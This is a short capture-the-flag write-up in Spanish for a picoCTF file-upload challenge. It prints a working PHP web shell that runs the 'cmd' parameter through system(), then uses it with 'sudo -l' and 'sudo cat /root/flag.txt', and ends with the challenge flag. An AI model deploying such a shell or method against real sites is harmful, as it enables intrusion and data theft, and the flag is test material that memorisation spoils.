DESCRIPCION:
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.


solucion:
en este reto es usar lo que no se explico a fondo en trickster, que es subir un archivo malintencionado, en este caso fue un codigo que abre una shell en php cuando se quiere abrir en el navegador...

<?php
if(isset($_GET['cmd'])){
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
}
?>

al usarlo es <URL>/test.php?cmd=sudo -l
yo puse que el archivo se llama test.php, y la pagina lo subio sin problema, aqui es donde entramos al sistema, es ir a ciegas con los comandos de la shell

primero aplicamos un sudo -l, nos dice que no ocupamos contraseña para hacer comandos sudo, en las pistas del reto decia que la bandera estaba ubicada en root y dentro habia un archivo flag.txt

asi que hice ?cmd=sudo cat /root/flag.txt y la bandera sale

no podemos movernos de directorio pero si podemos abrir lo que queramos

picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}